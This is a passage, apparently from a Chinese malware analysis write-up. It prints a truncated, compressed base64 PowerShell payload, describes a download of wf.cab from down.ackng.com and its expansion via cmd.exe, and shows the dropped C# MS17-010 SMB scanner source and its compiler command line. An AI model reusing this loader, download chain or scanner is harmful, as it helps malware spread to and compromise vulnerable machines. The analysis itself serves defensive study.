zqfliKUG5T0hkH9rPhoD3/YPpoxOhQZzChNO0eUz3bHonBLQFFnzxe81CO+I373U5koCQxkRL3Z34DQz7L5+3Bn8UdLs7Hnh+wt/mhp1sD7WZaXQRPOnX+4u7hJmn5++YuhEqVcyirdLttQe8KO//6/aF216OgDFx1/19/tRfWyri4o7d18A1nnVU5Y0uinJFtlTiOZZuV0XWacd6L00BeUA8bKYb1e0lJxHh3v3T6Y9Fvp7s7OLRJEkto3A0q3kfG6LNprSvN/6/vpV6uyymZsgD16pttsg/kNR+CP0u3XLYlek360cVS/ewo9gk8f0SsvpaX5aDNBNg/nxlxX3DP67NP79+99+l5vguqbPB9+xQYcgQ++UWUMfWUWdGK8nv+iDbwu0VP/+zpfZMUSSgVL4Zv45CazE3MrodOGu3wvgP/fmqOvT8aMzcwtkSYjhFy7HSoTmT+ZllmD1Sa4sO8Lhf8o88u8FAD77wvARSj+5PNSAcbWFgsyaTdrpKEngErjbH//jFfKfxYACyd983Cn82x5YQDf4IttehCcjDr/fKPQbmUHb0wL4LmNDbRS+Dpvz4ijbpZDPN/EGuOmr/H8btUaa96/v0afhCOvfj+DEVyzbcxn6Tl5jekiX9CKzHutgp+UVXMLnYPna6/SxD7uf9ppGP4VgLd/6Cvkk0w1sPLIKU7Fl0w7otj299Pfbet3+/3Hp++m+Qq6YPyF0POO0kuBnVOupiyvFRzwcCBh/liQWDbH3ya7VuYe73Um02/LdPb91GBEABwYK3FWb+xgOMnU689v7/dxM2LRZOjvdiafbkBO3xubiKKspm9//zablJQ20s8QMn1crfJlh/V677rMSwSCl5fZDMZ762fS784pttr+cvLTtA6W/mLijI+ek3pMje/5EQGmdc/tp+TwptvnVb3I2rTxmLRLp9+1T6iqTvs54y6ZJPIYmLAweBmeK/7F/uVpRkHCX0J+ubZLyEPS0tE4gXwYNzBsMgTwJ/N6QjgPQlSkzymwYAyn1eqaogwIHknej73M6myxJa2/t8If5IzXW18QB2ZYfP6MUm/r/M73v0fpWyxZ/27FimzQj92qaTvPZxXcQbVat3ppTWHxrXuYLmbUlEjzYyCY7U+mgaQhK+cVad07RLUf+zFCfTqnpAb4mRQQfqWPfwnI3fv+Im/xa4MG9H9iTpJSOEyHxPISeWprSpesly0+/uQT7aeZ1sWqfdQuVsUKwIpV52OMEV/gZ+crReCjj/zPNd8jH7b1NXfzY99rlAplQU5HTZL1WUo6o3qbb1MC4STdfirE8OnyFfW4JLJK3+k2kjx2KN/73YrvS2hIfPKcgFKox+ov/X1/X2rz++IVih0vheMYhx9n3bsNKqcWD/4GE2I+GJ9RRPDuy/Otj84zUoyztK3SbE1oLdsC4S6l/HnGtndpqlJ+nYeZCo/i8fvx0NVvLSnyd/m0Q4rTdPsNkr784tclCgWuC1bKwnH0/BK2ib/4l8hfGK3p243WvIVvKKM2wzgpENNxmqHVOSWylm6sClL+7Q/WTfcn3+R8f4QJ/6gz49PfLTbpP1wUNmPg/5nVlL/7zPHh+PWqLNqtj/4AWlOSdiTH6dbv9tOfQYx/WsTYvmkF+ac/+SS9o+qRmcvqs3yx+v1XGXOXe+97v9tPf197+vh7H9/53g7myfCEe2V7AX5JP/r9ZtsfiZ4A3qsKcZxrZnnn49/3Y8XZMPf3vv99yk22cxkmEd6DPn69nkirLYC8Y15VVtIfMvq3PPq3MnoL0I7+LY/e4me+/97v9taMK6qV+HP64PfHGxhS8OaYcFts3fnk49/3eLUie5/9vq+qbEHo/r54Z9y+az929P7dplWdvy+cc4q85qsyuybPjNSoD64qZ+8L7YtiWldNdd7+vt+lZEZ11fy+lPOq2/SLfLn+fTmLli30s/Xq9yVzOp5kGILpsiyWb392+3yG8b6U8ZbLt67vqDi+vyySD2MF8XebXLdI79B0bz+lKIbcYJFXN+MkteINfbNYPM1LZAsNIh/ZuTQ8x269x45sRtTeh7xkPvnZwsx2xKh9gz31ZwJddWfCdd+ZCY8Zv2HEeiSwHf3skwBddUnguu+QwLl49Hz05Jo0ZmNQDDXkhIKAt/wrf+DZ+F+ifvTvxl7l2flnvxs0Tn6IJUuNcF5fU15vMX4zR4BIEj3+gmz+uy32WUcff15Wk6z8fZ/L6x+Pvlfn59830O4ELvpsQpndXNy82/vn0jtUyvj1LypPJObBb9VymTPg7/9uzS8qp/bPW3vZ/BZ7Mr+xONu/G8AusKjVH34MAfOuvjfWT97k79iUBvBdG4MnmgTjSLXZ8SxbtexJ3wYNfKJvhO+PXxMjT1vjrGlvNDw0w1uUrxruQxt0QFLqqNwyL9/xIY3fILpuyE2gCPkZB73b/BFx+5r8YuYzywqLhojD4dp78cL7x2qQiVs3dmFXZ2JuNxPuhR4Eb9qlMzgYWP6XgKlYHaaANyHRo78X5PrQF4cpVEl69vSztMkO05c0lKuqnrHpJUkH9U3QFErAGIkRRPtG0tFE3fHf7Tzj1OKP/ZIf0/eNWKbbARDlX/unfCu89BE8/7RZ/f6zmrp619I6bD6jNbVp+vG71e9PZGzmeVl+fPiRp2m+blezyXSaZrOZ381W0M2I/iqriwc74xn9deeb6PT09z49wfjo+/PiAgv/Hzfz6orwuMyWU4r0Ks4ENh+P0t3DV6cnX754dvb5V69OD5kwr1/+/vaTkCLd5l1cMVFfB1+vj/Rj8PHHbAi86PIjSkkRG6VgnUe/mzEVXvddhpWMEZjMcE5br/Nu2oXiz2JFs1M3wL3bn3xFmZvxeIzufrcLthaP9JXfH6mH35MZtftN5b6hnAbnG+RPL2ooVs16wl98vPtwb7z76cF4h5jB/L7r/b7n/X7P+33f+/2+9/un3u8PvN8PvN8f+n0FHfut7vlo7D70X9q773f/KfezM96RQeCXXfPLnvyyaz55iP/Zz8xveCFGIp+YdX6Rv6M/v8e/fP+j33fy+85+8e7o3i/5fcfDv0w+wpzry+MvwDJ5s7VFLg2LR3qXpujOHdH7p9l0bnOj7LwX5xSdySRuL6uW3mnJT2pSSpz+ZFaukQH8sR/7xak2oQDQfIE0Hzsswx3PigbB0WzZ/DD7X+YtLYPw8nT1s9jvb8wJupwAb/1uZy9T+JjcFi/+YtvD2csxB0/Nd4t2vvXR7t6DMfIxHBPTWxqff7x3//edjb/1ceybfe+bLrgdA0y+8Pr59CEY2H0rMcrumBl374GE+Yym56cSQyK4F5tn8hhjTWP8bhTtE2kJFH+NhnAnPkmpBf1rP9uNfLYnUTxTRPRCSHMDWnr6xXjPKA/3HQGUz8VL1tn/jT0z+yJvdY4Dl4A+Hn83n5ywK8ANr8psKVlS+8r4aXW1xKKbeABbH83bdtU8uns3WxXjYkV+/biqL+4SRSXoVRiGXvJXh2b8qQzEax5Szfs8oJz3uVCPl2witNM+DL86nWJ7/yUmd6/ZPs+s+NSz5gAKSN0okO7pi9fff/SIDMa3yXI8uX5BjtrW77Zck1IZH8sLnLU1qUSJLjyb8GPPREx47llObE+OC91rnzB7jc9eKvA3lcyIciglb30m7TXrsq2sdOlLID3nQlkENDiTr3WagqYeH9uPQ/a2HyuHD86S6UNzZJbFPzF98kTxl469g3n63eps+fvL7ALTjz76ZGv3ky0sZb0iJ4NWibe/yN4Vi/UiJcG/c+cTwnFzi9+4b9eZBF4/v7FZhPjMLUHs3f/UX3ewCwPuvQ4QxuR3K9xsRMhjm7tJUT7+xAfm0ScIkgPXhshJfvkUmcVHH2l3Y/7zTqclLV71Wv7+lWtr9Tt/s6e8q7P4izEpEZ+JEN4dQ/n+zO/+i/VFocDvb5ANwd5zYH//ahhwFQF8rwM47sD1P+0ukqZW+DqmMP0lXZLBbzRqYlYt89/1d/2o63QyrGaaLcXSmvjxx75HE/P93+1lVUM97+/fH9nPKK2IkGvnN5bwzu+P4azwzu+Gf9VT9XwoBFNEDOdDTVnN8wfiOatX7j4BE6JLu0DHdBGFosQGQXlJNB1sA4Zm+BNw4u/PTPMZCYd0iT8wHm+uPdXX3Ek7wiNYh3bL08GvaY2d3Jrxm+nqxJoxOzSgBQAU6D7JL4qlBgrodMRkG7G+ln/VmhuqUMprxYvt+oGPjvel7ZSlz8WtP/Zdb4nstK6rWpciuJ0Q4pNP8DtRfUv+/t19krFjsmMcH/eRoZRKo+oFnzVWGWXwlCF+7MfYLdp+XeY5cfEXlAgp0ns7Ozv8nTcJuzwLOrzx75Vfm6lQ78Qb+O73TV4gn9lGAWmoxelyZqntk3T3+6rpf8xyqBi2XflYVH0XmoZ1/J206LGzN3XuM6MAPmqrNitTFhpiONVsnwhZf+NAsgxav7GNIEfuIxZoT8hUg5B/q4vIv+fWR9mMFhDI8NfI1nw0kr9hdKPvIbsq793bnX06Pc93ZrufZvnDe7uTB/em9x/OHuQ7052Dh9MdAnVvL58dPJjMJvfPZ9P7+cPpJDs4uL//4N6DTw92D2b71OTgYP/T8wd5lucH55Pd3QfZbOfTyWx2cG9n8uD+wadTavJgcv/hXr5/frD74GCyP31w/wEBof728gf7BOgBcD4/P88n2e6DT/d2d86z2f6newfnO/f39ifn+e7D/T1qcv/Bw1n26e7B9Hxynh3QVw+y6fnu+cHOTrZ3sJMBl/0HE/r73kP6eufT6ezTB1Nqlu3cOz8/2J9k+zmgZPmDycHDyb3sPKf3Zvv7B/mMcLk/fbCzv3fwEIM+f3h+/3x3d2+W3bu3k033p3s7k3zvwcPppyQI5xlGdO/8/uzhg/v7D8937t2792D/PPt09vD84TQntM7PZ9Tk0/PdvelONrm3RwR9+PBgb3cye3jv4Pzew/Msm+zMqElOyNz/dA8ws08n+/ufTqnxp/vZZDefnN/L0WT3093p+fnOwf7+gwfn+f2Hn2b3ZxMi/YP9/YcH2R4GPbu3M93Lzw/uHTzMpg/zg/u7n06ybDrZe7j/6b3Jgwk1mUx3dh7sHOzNCP6DBwf37+d79++dz/Zn+Xn+YCcHXfL9+9m93f3pp5/uz/aJonsPzh/e39/Z3dud7WZ7D4HLbBedfjr9dHdvb7I72f30PhH13sOH9/b2P71/f++AmpzvTyY0Q7v0XXbwcG//4BwI3ZvsfUpz8vDhfZ7Gnexh9imGcT7JHtD4dnd2DrL7u7P96cP7GdDNd7NPH+5NZnv3JrP84UOQ8MH9T2n093aIf87RUXbw4PweTc+D2QP68P50//75w30aeE689WB28Ck1Ib44P58dHJxn9wjQzs5s//6nOxOa2/x8J5/unWOmd8+nO7PpwfkDmoLZTn4wmT2YTqf3Dvb3zvemOZjh0wf7+f7B5NOD6f0ptSCAxOz3acJILO7NdkG6Tx8+3CfJyYna+7M9Gs7+bELJuN37u/cOJg/2MKL7hEY+OSCS0C+Th0SR++c7D4nSD2a79z+9DyGZTGfEcyRnDycZ0fQeMcNuTvKQ5/f2J/d2MNP3ZkSPTx/SmCmq3CHaPdzb2Z/kE5qPg3ufPgBdZuf3aVbvnd/bv3dA/9/bIXxms/t792Y7e5/enwDdB8Sku+e7D4g58/wBYTMlwbt/b2+2c3+fGByke5DtUQpm53w6uzd7cJ+Gt0vsMd2nT3b3783ug3Qkjbu7O/TZ7v79nV368kE+ne19+uDT+w9InB4A3eycWP988unO9MFkj7hzl8iX72UkDtSMGIea7M0enO9m90msZ/eyh5+eT+7v3n84uZ/n51AkU+Cyv3P/AcGgb/anxJAkLfm92d7DbPeAULr3KZrkB5ia/Yx47WGeTUiVkbK6R7I2neT0DgQWpJreP5jtEJEP9mcHew93ScXtk9yeTwhz0OXeeUYysENd0Tge3svy/enOfep5lwgzzXZ4jrKdB8TyxIj38vuT8/29WZ7tZ+cHpBZ2HgoznO/eu7+bTQ/2iIcOZqQYPp2R+Hx6QBr1fPpw95zR3Z/tkAbdvfdgb5cIn386+XRGn9EfpFsnGBGx3+z+Pg34Hk09cene/uzTezT4PKMJ2z9nLbV38GCPVNku4Xb/YIdoeJCf730Kwb+/tyPUvf/wARGJ+ONedn8vy6gnGhfphmm2RyodSnVKonyPpm+HZD7/NMcM5TSAA+jve58y7+5+upcTvSY5acS9vfvn+ez8gKTx3kG+O/2U/kRHO6QbadJnGfHINMsn+3t750TP+9kDgnoPzECK4N6D/ODe5OAe8Ur28B5J4M7Dc1I3Owefkv4Fde/l03v5zj3iEfDthChwPiNpmpA23yepBTPks4e7pNOnk/v7OQZCbLJL2JAJmjwgXgTXZZ+SGXhINm2XZJpU84zU8r2dB7u7s/sHhA8rj53pQxJzsgpkK2h+7mfnO6R3SauCQ1nvks56+PDT/emUlNjOhD7fv0/T8ZDUdf7pAxbYWb736XRK+N7/lHib+GBnbyd/QBJx/0F2Pn0A6pLpmk7PHxA/E7pkFndIfT/coa93700JIprcIykjZZLNHhLtPiUS7D44fwALNyUQpAcw6N1PyQxNJgd7xIf3d8gq7U5zGtx0N38IcQd173+aHZAqJlk9353kO1DcBxOS/Ief7hGlmRlyUktkJTJiFzKuBPr+LMtJNx48fEDyCWs/efgp6bEHO2SB93bJLE73iEjEIZBIYllMAHHiAyL5PlH1fJ9afZoRB57vZTRxpGwesFUj878/nZERI6O1S1P76c7+Ltk9kiNqy/plQqaSfIH79BLh9Gn+6QHpOqLlpzsP9qDlIbCze2RriG472af3aEaJ/DR2Ijn1n5OupyY7n35KpnO2D33+cEqam3x+smcPdh/uEnHvYY6IV0gDTUnK88keSc9klpFWIFV9QGo02we/3D+4R+x1QNp+n0wAsVJOyuUhuw33obFAutnezoykKtt/8PB8n6wNaVmap12y5w8PSA+wNJI+Jv/mIVnf6b2D+yRExOPn59nOZHe6nwGXHVKlpNR2H5D6Oie2Ir27+5CGdj4jNjvI2VHaO79PyB7snO8QMOIdQp0sCCH/kP43gaN0/ukD6vweCQ7ZIuKQg0lOMk+GPc9piA940NN9IuYBnA3ShQeUYXlATPeAfuYPH3z6Kbgum5E7QB3cn0wPiOYHO6QoZtTt/n1yVHZ2WY7IpJBC2T/fId1BCow62iPGJRJk5Bhwk3ufEueSjZ6SlzN9eD7Lzu/tkTra3wOH3jsHLqSOHh6cz3b2H5A+fDCdkdYlFXGfdHFOBnQfIzq4PyPcp3uz3T1wxQOCSAJFHuk+mSCydICyv7tP9N47332YPyRzlpEW//Th7sPJ5N4BYYOO8gf3yAnMSQcewKu6T1iRgrj/MCfem5BLio52yXDvklkhwzsjT2KXtDl1Od3NiA1n9zCND3ZJ5ZKh+vTBjF4k/fHp+b0dUk8k9TBK53Gv+ruLYvrV69NXMXf8DnJxUUcca0vyRpOJy05Tt3ePvBT6ZaWLmPTry+PXr7/75aun8jVFYQueQHrh96S/6ffjzL72i67ymv+g37+9zq7yQtvQv79nNgGhLqpylmtfv+vv+eP0Bn7/RdkPfs/vvv69AW2ib9BHv+tPHP8UPkJn2lcn1jieTL0vtLOH/AB1jGKHR0HfUFfUIXi4qloiQkm/XuVYnGMUuBH9sye/AdA98/u+/rgvP+2YtAE/9At5pPLJp/xwG/z3EbxBPADPz0cIXPDo6/TjPj+mo08fuN8OvF8xrIcHD2xPZuYyQwj6ZbYrGONXkER/V+qsfk83te5X/nTHfWp+tXPPv+7or/Zrfbsoq8v8ulrTr4tq+Ta/pl9oqZcxW7lJkAVz+gULoBX9pDm+at6ZRgQLQwITtYCAZXadJ/lsXVQr+qNZr/KaFlRBFoKwJyDO19O3goLMNf3yg3fTy4nBAUTgh3G7xPfdyJXeArmO3a9onApIf95lKjCdB/p8JPNoOAG+yj2eDisb8gsAkn9Edol56hftXd3L913f7g2Zavs73pvV2UWF4TTrZTMvlhjCigR7mvPoiLl/t9/99/uF36Jfp/OspnQBD9kiMCdGL6npCrBMz/dbwMv4H/0haNCy9d7Ozn3+hH7hoIcFGFyVn1/wF56aMFqAufX4yYllSALkNROwQi6QaJ+ZE/MgRFS6A4YifgcpiN8NvPD7l8XyLTLeb47xnH51fMG/HF8d63M6WZlf3+v5ichnT7968uz4+PyrL5+83Dl5+ou+XLz9iaq9ODs+aa6++M7OTx2fPHz6ZWl77j1fXRy/8/8+PX7ye2ffvf+WorYfHD+9Oj7BR19+8onX5BeFECLPs+lx9hNP1sef/8Tx5OrJveNvf4FPv3v87Pc5/uInvHZPjo+n98ofzD7/yfaLH5zRWPa/Xn8EP/+JJz84/jYp4p940h4//eL4C9D8ycXx731xfB02fkK+2ovr7Pd+svN88ZP71P70mCboyfHTy0udJzy/l/d7/JFx/T5XT66PP397PD1+snN8so/+948//woNMvzznZ84XuPz3/u4+/PJ7433JhdP3h5/fnA8uyL8n10dT6+e3Afc2fGT8vjzneMvrgh/+py///yL4+nFk9Xxt4/pe4JD/eRod1IdP786vsTfX148+UXHn58ezy6ezPv4HR+fXRyX+J7+vsL8/D4/QZ/T39/5iSfT489/n+PJsbyX8fdX+P4+4E4vqL9v03z+BH1+QuwFuN/+CvhTv/vop/THf8o0Ijr8XtQfPbs/AZIxHz4/Pj65mO08ePL5enrye3/16b1XJ5++q8vPf5/2Ieh28lNodELtq7Md/Pruq90nb/ar1e/zqn73xZenXz64++TLN99ZzdsfLLkX6erJAf695F6vjokHTo+f/8Tx7vHJDnjhHf/8ieMfgDdeHB/vHz+9OH5xRSIJXuH2Z/j++vjpW/ykz3/i+MtjtD8DHP78y58gOE+P9f1jfH9f4V7hb+byyPORUw3rZvL7lzdph+xJFMzXeX6vnziGdrg4Ob54cPJt1Q47qh32vuw2zwzXk1A8/Yknv9fx0wqcWoATZj8BjjwDh+xihl+AI+hvlnR6Xl08aZizrp5U4LSvjuXvHO99+wxAX+DvCTjz8ylxyvHF8anPcUQJQlb+fgtOumY44Kxv/wQkYgVO+ylIgjw/wajSv5XQnsVOns8+86jeFBdLkPwL+fh3m1y3Vkt/j9Lhl2S1acn4WV0tnlD7T/dfy5q6U+d3zFtTSs3f6i00tG8pAje/hYZ34snscJEs6mG7tTdt0lsv/eyjj9ynlEevr2Udy3x0Qal1ypjb5Snvc7aOs8gXtFJLy2+RL5BDt5Dom/xdvspapNV/t3x5+ahdrD756Pe9Oq/zvJ6txvQtcJtVV0u0+ixoM6bgib/9/Rnpz+5RuHA1L8p863fdepM37fZLADY9yOpM+I0A+30XxaIYzzJdoMHKmoLUdZ1fPKGll7dYm9ha0spW1VvZ+m4+OeEljjvjp4RqWWWzZ8CDliQvfv91XX7y0V1Fd2THcke6aoEOU8B9I+s008UsvTtN83crWvh236bb54++ZXHXNROD8PY2/dHwKlLDq0j3dB0Ei3QIpzqLzAUWI3nx6XejsaxoFnipnaIyXb7bPikRa323WN7b+/2/Ii44nnZXlmnBqeUFKUBQ3H83wpTc5eVnH239vrNfvP9Lfrc7vMDFy2e0EHj2NN1eYPksNQ1pdjDKrd8t0+WZcBG3Hb/IFjnNT8qDoA7MMg4WpORbfw0Jy2Bb33udT9c03OvxS3iaxO/lmAZChGzsB9/f0OiMgr2WviHJJKKcrOua/t66c2d81pwtX1U0vxtefrIuylaafT/txH66EPi7QRayus4gbxANGZtd6MPXpGdyJq5tq4uI/AGkxrQaN6uyaLc+egSvEw3WS/O1rmbSO4396N73wRa8Yig9fW/3+8zuH9/f2fmYZcV8PC7z5QUYj77d1+5lodFMQjhZ66Vp5M/SR/S5rHKadUMDgkcSgpg3PghuwCDmTQDCrBsyNVUdgYfPlpfV23z7i2t8cGf8Kl+V2TTfQjiUfiR5BXphsfjse3V+kb+jCWZuzJstA2X08e/7LbD7khjr0fiTj+8c6kur1eaXXmq8IC/xK8vl5ldevHn+hdd8Ntvc/CmrVveC5Zf1es2sslgYHqFPPsM/48usXOdjMg2LLUeOj90IP2a6MDiRHQa2Tbz30Ravt39kBRTgzpaz/N2X51sf/QG/G74gvtjetQ2suehwxXptFsBdE+GL9Vpmlafzg/sfYEqv+5Arg975H0vR1WrFFF2tzKv0yWf4Z4iidvr7FAWw6IicHQ1RphdsG3RpxLBs070dn5b6Ng+HGvaJOdi1yaV9nY7Nu5FuQyrO53Om4tLoBXzyGf4ZoiJLRJ+CAIRhfHzT8vvHPm3F4+jol/ncJ6A0EQ0zn3fpN6SjCIYjhaejAgghKWazGZNiNjOv0ief4Z8hUqi094nhnKwQLYJlRw+4G2UF+EQZw35BzPz2oq7Wq8h37IScfPnFy6/enL56cfzFqbFsP+ZhxzShVzo0of//kim02y9m/U1uXLEkR+D3Py+zi89+t/OsbMig/27syvz+bbHIP4Nf8jRr83T7q2cVpdDIf/nd2RoYp+93a+s1vGv14ba24m/c2fag0pgu2vSAVtJ2vrVHvot19H63VVW31Sq3LiyZi+b3739IGeHIp+S69j8lkqjL/Ruz70QIf7ZzSL4TyxX98skn6j3BJDtq0IfUcpcplxNZUiWxTy8M3XKbj3tZTYmU04y4BJ+m+/v3yYGkd8hr4rbhqLrNac36Xti+M+DuC5/epxWP8I0OMbpv0GJz+AJG3xrPW4baTCl0miHGol/lo0VD/rH9dNFQcu73p0+UNCv3Av9uvgAu5gv+Xb74JalP2KC3arC7arA/75tOh/Ybnij836oGciTrQs2NUot8L/blBC8R+4D+oeQLBCum8qdV3sTnnxrx/DH5148FWCZSQj7F3CwphjSRwY8xklu/GyZv55DUODOsMaLjE4QD+JjYV6H7gE277/1uy++n+vW0Wl3X5J5u03jNuLfbec4aY5l+xCyCtz9Kt9lQB0C2ERhZkgtI9SgFT4uoYmp1kcPVRxb8ZptQD+gCRmb8sW0igMkjEcBwTRQwuzEW7nrtwb1xnL1eZawG6vcIXHy0drzmp/6QfxHq9edBJzif+POr0/tjv9vluvzsey/pwxNa5ijz8Wu0wcgWuw+aKTmi+MCw1B19C4SjF+9IYNnr0Iy4yfNFg46pLcHMJgSfurbv/G51Dqc9nzywRLIi6CCjM2qoGnKwM0C5qIiR29/1d/1dXR+BgAedHvQ6tW0iXQ70eRDr005Sb7as3cNf/G/EVfD0gaejoRKMnpIW/Ps3qRv6TMPqLsI3Im6fhUoBPuGYcwSDSmHrozeUW0HDR+lHn5iXINx3fuOE2/5ubA8+k557IsRup/+aSolT0h6Hqgk1c7H1gjI4mtwYSN2Y5JtJ3nx8t85B1vFPN9Xy92ivV/lni+YXFqvPPv5EUfrk418IVPCBhxV92uKj1gjMj7F7ERPdzfPvW9CfEwYgBOLTr2GSBj2MrBIgZgvctNtXrAbSCfcTbK+evhw/eUW+5Z0xBcHTt1smlTdS9HuroBbsSDxIX1MxH1g28LF6/dXJCQmu+ep3m9TrFgY7hoppBIjc7mugxn6qZya+GZakORriSdN1nyF/7HsY2ckXT0nFk5idLGZb1mVxjbpT2FYpZHJaLWgle+aRzmo8PwW5uxNSlpK6lKcKZeJQ//olv3HifjihwP9/N05wfvLJbwyPP8RJaEEEYkSs/fvdFtk07WU0JZVJdEZkczzLVuRFUwr+vLhY01QV1TL9mfRqnlNG/xf/br//uCBJgsWiiOf0J1Keul9yZ/xFNoUjTwvS1Lihlelpazhl+7yoCaddweBiXSA7vkU2fftqUWgbQeGkWqyIHLXkkV/W1Ww9pSn/6quzpyre1OD3R3oGzmM31JImV+f0nZdCNhltP4GutBhoaXLfmg38WrxIvwkj/uRnO+PdX3j2lLnQYE9c9/lX8hnIQX9+cXyCv2h66A/J3dOfMr/EtdNdZlqn8MSc8Fd7/GJgD71v7+FbXwmGX+9zN6Ey9b4u8LVdUfG+qPwvKu+LCQ+qs5xC3ywAKkjs/HRFuvGj3+/3++gOfX11Tl9/72zZfp8mEM3d34tzFgzPRcD/6X8fnb54+hEn8/8f&#39;)))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();</code></pre><p>之后它会去下载<code>http://down.ackng.com/wf.cab</code>，cab是个压缩包。之后通过<code>cmd.exe expand  C:\Users\admin\AppData\Local\Temp\wf.cab -f:* C:\Users\admin\AppData\Local\Temp</code>命令解压wf.cab。得到一个<code>s5vlqdlr.0.cs</code>和<code>s5vlqdlr.cmdline</code></p><pre><code class="text">using System;using System.Collections.Generic;using System.Diagnostics;using System.IO;using System.Net;using System.Net.Sockets;using System.Text;namespace PingCastle.Scanners{    public class m17sc    {        static public bool Scan(string computer)        {            TcpClient client = new TcpClient();            client.Connect(computer, 445);            try            {                NetworkStream stream = client.GetStream();                byte[] negotiatemessage = GetNegotiateMessage();                stream.Write(negotiatemessage, 0, negotiatemessage.Length);                stream.Flush();                byte[] response = ReadSmbResponse(stream);                if (!(response[8] == 0x72 &amp;&amp; response[9] == 00))                {                    throw new InvalidOperationException(&quot;invalid negotiate response&quot;);                }                byte[] sessionSetup = GetR(response);                stream.Write(sessionSetup, 0, sessionSetup.Length);                stream.Flush();                response = ReadSmbResponse(stream);                if (!(response[8] == 0x73 &amp;&amp; response[9] == 00))                {                    throw new InvalidOperationException(&quot;invalid sessionSetup response&quot;);                }                byte[] treeconnect = GetTreeConnectAndXRequest(response, computer);                stream.Write(treeconnect, 0, treeconnect.Length);                stream.Flush();                response = ReadSmbResponse(stream);                if (!(response[8] == 0x75 &amp;&amp; response[9] == 00))                {                    throw new InvalidOperationException(&quot;invalid TreeConnect response&quot;);                }                byte[] peeknamedpipe = GetPeekNamedPipe(response);                stream.Write(peeknamedpipe, 0, peeknamedpipe.Length);                stream.Flush();                response = ReadSmbResponse(stream);                if (response[8] == 0x25 &amp;&amp; response[9] == 0x05 &amp;&amp; response[10] ==0x02 &amp;&amp; response[11] ==0x00 &amp;&amp; response[12] ==0xc0 )                {                    return true;                }            }            catch (Exception)            {                throw;            }            return false;        }        private static byte[] ReadSmbResponse(NetworkStream stream)        {            byte[] temp = new byte[4];            stream.Read(temp, 0, 4);            int size = temp[3] + temp[2] * 0x100 + temp[3] * 0x10000;            byte[] output = new byte[size + 4];            stream.Read(output, 4, size);            Array.Copy(temp, output, 4);            return output;        }        static byte[] GetNegotiateMessage()        {            byte[] output = new byte[] {                0x00,0x00,0x00,0x00,                 0xff,0x53,0x4d,0x42,                 0x72,                 0x00,                 0x00,                0x00,0x00,                 0x18,                 0x01,0x28,                 0x00,0x00,                 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,                0x00,0x00,                 0x00,0x00,                 0x44,0x6d,                 0x00,0x00,                 0x42,0xc1,                 0x00,                 0x31,0x00,                0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x31,0x2e,0x30,0x00,                 0x02,0x4c,0x4d,0x31,0x2e,0x32,0x58,0x30,0x30,0x32,0x00,                 0x02,0x4e,0x54,0x20,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x20,0x31,0x2e,0x30,0x00,                 0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00,             };            return EncodeNetBiosLength(output);        }        static byte[] GetR(byte[] data)        {            byte[] output = new byte[] {                0x00,0x00,0x00,0x00,                 0xff,0x53,0x4d,0x42,                 0x73,                 0x00,                 0x00,                 0x00,0x00,                 0x18,                 0x01,0x28,                 0x00,0x00,                 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,                 0x00,0x00,                 data[28],data[29],data[30],data[31],data[32],data[33],                0x42,0xc1,                 0x0d,                 0xff,                 0x00,                 0x00,0x00,                 0xdf,0xff,                 0x02,0x00,                0x01,0x00,                 0x00,0x00,0x00,0x00,                 0x00,0x00,                 0x00,0x00,                 0x00,0x00,0x00,0x00,                 0x40,0x00,0x00,0x00,                 0x26,0x00,                 0x00,                0x2e,0x00,                 0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x32,0x31,0x39,0x35,0x00,                 0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x35,0x2e,0x30,0x00             };            return EncodeNetBiosLength(output);        }        private static byte[] EncodeNetBiosLength(byte[] input)        {            byte[] len = BitConverter.GetBytes(input.Length-4);            input[3] = len[0];            input[2] = len[1];            input[1] = len[2];            return input;        }        static byte[] GetTreeConnectAndXRequest(byte[] data, string computer)        {            MemoryStream ms = new MemoryStream();            BinaryReader reader = new BinaryReader(ms);            byte[] part1 = new byte[] {                0x00,0x00,0x00,0x00,                 0xff,0x53,0x4d,0x42,                 0x75,                 0x00,                 0x00,                 0x00,0x00,                 0x18,                 0x01,0x28,                 0x00,0x00,                 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,                0x00,0x00,                 data[28],data[29],data[30],data[31],data[32],data[33],                0x42,0xc1,                 0x04,                 0xff,                 0x00,                 0x00,0x00,                 0x00,0x00,                 0x01,0x00,                 0x19,0x00,                 0x00,                 0x5c,0x5c};            byte[] part2 = new byte[] {                0x5c,0x49,0x50,0x43,0x24,0x00,                 0x3f,0x3f,0x3f,0x3f,0x3f,0x00            };            ms.Write(part1, 0, part1.Length);            byte[] encodedcomputer = new ASCIIEncoding().GetBytes(computer);            ms.Write(encodedcomputer, 0, encodedcomputer.Length);            ms.Write(part2, 0, part2.Length);            ms.Seek(0, SeekOrigin.Begin);            byte[] output = reader.ReadBytes((int) reader.BaseStream.Length);            return EncodeNetBiosLength(output);        }        static byte[] GetPeekNamedPipe(byte[] data)        {            byte[] output = new byte[] {                0x00,0x00,0x00,0x00,                 0xff,0x53,0x4d,0x42,                0x25,                 0x00,                0x00,                 0x00,0x00,                 0x18,                 0x01,0x28,                 0x00,0x00,                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,                 0x00,0x00,                 data[28],data[29],data[30],data[31],data[32],data[33],                0x42,0xc1,                0x10,                 0x00,0x00,                 0x00,0x00,                 0xff,0xff,                 0xff,0xff,                 0x00,                 0x00,                 0x00,0x00,                0x00,0x00,0x00,0x00,                 0x00,0x00,                 0x00,0x00,                 0x4a,0x00,                 0x00,0x00,                0x4a,0x00,                 0x02,                0x00,                 0x23,0x00,                 0x00,0x00,                 0x07,0x00,                 0x5c,0x50,0x49,0x50,0x45,0x5c,0x00             };            return EncodeNetBiosLength(output);        }    }}</code></pre><p> s5vlqdlr.cmdline内容如下：</p><pre><code class="text">/t:library /utf8output /R:&quot;System.dll&quot; /R:&quot;C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll&quot; 